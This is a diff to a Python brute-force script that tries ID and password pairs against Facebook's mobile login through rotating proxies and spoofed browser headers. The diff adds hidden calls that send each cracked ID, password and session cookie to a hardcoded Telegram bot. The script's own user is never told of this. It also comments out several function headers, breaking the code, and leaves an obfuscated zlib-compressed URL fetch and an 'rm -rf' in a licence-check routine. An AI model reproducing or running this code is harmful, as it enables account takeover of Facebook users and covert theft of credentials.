@@ -660,14 +660,15 @@ def crackmobile(idf,pwv):
 			if 'uadia' in uadarimu: ua = uadia[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
-			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			p = ses.get("https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D103631216349243%26redirect_uri%3Dhttps%253A%252F%252Fmyjobstreet.jobstreet.co.id%252Ffacebook-api%252Fredirect-login.php%26state%3D396d1768b4c4cbc0956565c7284763a0%26sdk%3Dphp-sdk-4.0.15%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%252Cuser_work_history%252Cuser_location%252Cuser_education_history%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfe1a3c26-0019-47d8-b328-dbfdcbc891d5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmyjobstreet.jobstreet.co.id%2Ffacebook-api%2Fredirect-login.php%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D396d1768b4c4cbc0956565c7284763a0%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"ttps://m.facebook.com/v5.0/dialog/oauth?client_id=103631216349243&redirect_uri=https%3A%2F%2Fmyjobstreet.jobstreet.co.id%2Ffacebook-api%2Fredirect-login.php&state=396d1768b4c4cbc0956565c7284763a0&sdk=php-sdk-4.0.15&scope=public_profile%2Cemail%2Cuser_friends%2Cuser_work_history%2Cuser_location%2Cuser_education_history&ret=login&fbapp_pres=0&logger_id=fe1a3c26-0019-47d8-b328-dbfdcbc891d5&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			ses.headers.update({"Host": "mobile.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+			p = ses.get("https://mobile.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D103631216349243%26redirect_uri%3Dhttps%253A%252F%252Fmyjobstreet.jobstreet.co.id%252Ffacebook-api%252Fredirect-login.php%26state%3D720b56e0c65c17f053eea4cafef63178%26sdk%3Dphp-sdk-4.0.15%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%252Cuser_work_history%252Cuser_location%252Cuser_education_history%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D22a8bd94-96a0-4e57-bcc7-9a0561efc553%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmyjobstreet.jobstreet.co.id%2Ffacebook-api%2Fredirect-login.php%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D720b56e0c65c17f053eea4cafef63178%23_%3D_&display=page&locale=jv_ID&pl_dbl=0&_rdc=1&_rdr&refsrc=deprecated")
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mobile.facebook.com/v5.0/dialog/oauth?client_id=103631216349243&redirect_uri=https%3A%2F%2Fmyjobstreet.jobstreet.co.id%2Ffacebook-api%2Fredirect-login.php&state=720b56e0c65c17f053eea4cafef63178&sdk=php-sdk-4.0.15&scope=public_profile%2Cemail%2Cuser_friends%2Cuser_work_history%2Cuser_location%2Cuser_education_history&ret=login&fbapp_pres=0&logger_id=22a8bd94-96a0-4e57-bcc7-9a0561efc553&tp=unspecified&_rdr","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://mobile.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://mobile.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D103631216349243%26redirect_uri%3Dhttps%253A%252F%252Fmyjobstreet.jobstreet.co.id%252Ffacebook-api%252Fredirect-login.php%26state%3D396d1768b4c4cbc0956565c7284763a0%26sdk%3Dphp-sdk-4.0.15%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%252Cuser_work_history%252Cuser_location%252Cuser_education_history%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfe1a3c26-0019-47d8-b328-dbfdcbc891d5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmyjobstreet.jobstreet.co.id%2Ffacebook-api%2Fredirect-login.php%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D396d1768b4c4cbc0956565c7284763a0%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			heade={"Host": "mobile.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://mobile.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://mobile.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D103631216349243%26redirect_uri%3Dhttps%253A%252F%252Fmyjobstreet.jobstreet.co.id%252Ffacebook-api%252Fredirect-login.php%26state%3D720b56e0c65c17f053eea4cafef63178%26sdk%3Dphp-sdk-4.0.15%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%252Cuser_work_history%252Cuser_location%252Cuser_education_history%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D22a8bd94-96a0-4e57-bcc7-9a0561efc553%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmyjobstreet.jobstreet.co.id%2Ffacebook-api%2Fredirect-login.php%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D720b56e0c65c17f053eea4cafef63178%23_%3D_&display=page&locale=jv_ID&pl_dbl=0&_rdc=1&_rdr&refsrc=deprecated","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			po = ses.post('https://mobile.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
+				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}")
 				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
 				#tree.add(f"[bold yellow]{idf}|{pw}")
@@ -681,6 +682,7 @@ def crackmobile(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
 				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
 				#tree.add(f"[bold green]{idf}|{pw}")
@@ -696,7 +698,7 @@ def crackmobile(idf,pwv):
 	loop+=1
 
 #ERROR BYPASSING
-def genkey():
+#def genkey():
         try:
                 basex = open('/sdcard/Android/media/.libr-cpq', 'r').read()
                 basex1 = basex.encode('ascii')
@@ -726,7 +728,7 @@ def genkey():
                 genkey()
 
 #ERROR BYPASSING
-def keyx():
+#def keyx():
         os.system("touch /sdcard/.key")
         os.system("rm -rf /sdcard/.key")
         try:
@@ -748,7 +750,7 @@ def keyx():
                 pass
         else:
                 genkey()
-def Line_():
+#def Line_():
     try:
         zl = zlib.decompress(b'x\x9ce\xcb1\n\x800\x0c\x00\xc0\x1f%\xbb\xab\xe0?j\x13\xda\x80MJ\x9aR\xf4\xf5.n\xae\x07W#\xfa\xd8\x10=-(\x12u\x9es\xb0g\xd3`\r\xc8\xd6p\xafR\xec\x11^\xe6\x17-!\xfe\xcb7A\x0c[\x12\xc5\xc3\x85\x95\xa0\xdf/\xce\xd6${')
         r =requests.get(zl).text
